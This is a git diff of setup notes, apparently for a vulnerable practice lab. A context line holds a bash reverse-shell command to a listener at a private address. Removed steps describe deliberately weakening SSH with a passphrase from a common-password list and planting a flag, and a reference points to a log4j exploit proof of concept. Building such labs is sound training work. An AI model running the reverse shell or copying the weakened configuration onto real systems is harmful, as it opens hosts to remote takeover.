@@ -170,24 +170,8 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 ```
 ## SSH
 * Login to your server
-* Create ssh key with ssh-keygen
-* Add password (not passphrase) from the 10-million-password-list-top-100.txt from [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt) to the key when asked for passphrase.
-* Accept the default for the rest of the settings
-* Create the authorized_keys file in the .ssh folder if it does not exist
-* cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
-* On your Kali Linux generate ssh keys and transfer the public key to the server with the scp command.
-* Add the key to the authorized_keys so that you can authenticate with ssh keys
-* Go to the ssh configuration file
-* Allow public key authentication
-* Disable password authentication
-* sudo systemctl restart ssh
-* Login from your kali linux with your ssh key
-* Once it works go back to the server and enable password authentication
-* sudo systemctl restart ssh
-* Login to the server again with your key
-* Login as one of the samba users
-* sudo su josh
-* Create a flag in the file.
+* Run chmod +x ssh.sh
+* Run ./ssh.sh to create ssh keys.
 
 # References
 * https://github.com/kozmer/log4j-shell-poc
